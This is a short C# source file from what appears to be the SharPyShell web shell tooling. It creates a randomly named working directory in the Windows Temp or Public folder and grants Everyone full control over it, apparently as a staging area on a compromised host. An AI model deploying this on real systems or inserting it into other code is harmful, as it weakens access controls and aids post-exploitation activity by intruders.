
 using System;using System.IO;using System.Diagnostics;using System.Text;
 using System.Security.AccessControl;using System.Security.Principal;
 
 public class SharPyShell
 {     
     private string GetEnvDirectory(string randomName)
     {
         string envDirectory="";
         string osTempDirectory = Environment.GetEnvironmentVariable("SYSTEMROOT") + "\\" + "Temp" + "\\" + randomName;
         string osPublicDirectory = Environment.GetEnvironmentVariable("Public") + "\\" + randomName;
         try{
             System.IO.Directory.CreateDirectory(osTempDirectory);
             envDirectory = osTempDirectory;
         }
         catch{
             try{
  System.IO.Directory.CreateDirectory(osPublicDirectory);
  envDirectory = osPublicDirectory;
             }
             catch{
  envDirectory = @"C:\Windows\Temp";
             }
         } 
         if(envDirectory != @"C:\Windows\Temp"){
             DirectoryInfo dInfo = new DirectoryInfo(envDirectory);
             DirectorySecurity dSecurity = dInfo.GetAccessControl();
             dSecurity.AddAccessRule(new FileSystemAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), FileSystemRights.FullControl, InheritanceFlags.ObjectInherit | InheritanceFlags.ContainerInherit, PropagationFlags.NoPropagateInherit, AccessControlType.Allow));
             dInfo.SetAccessControl(dSecurity);
         }
         return envDirectory;
     }

     public byte[] ExecRuntime()
     {
         string output_func=GetEnvDirectory(@"x1fvogijp5pyzn7");
         byte[] output_func_byte=Encoding.UTF8.GetBytes(output_func);
         return(output_func_byte);
     }
 }
    